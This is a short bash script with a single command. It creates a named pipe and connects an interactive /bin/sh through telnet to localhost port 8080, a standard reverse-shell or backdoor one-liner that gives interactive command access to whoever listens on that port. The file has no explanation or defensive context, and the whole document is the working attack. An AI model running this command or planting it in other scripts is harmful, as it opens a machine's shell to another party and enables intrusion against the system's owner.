#!/bin/bash

mkfifo bd;cat bd|/bin/sh -i 2>&1|telnet localhost 8080 >bd
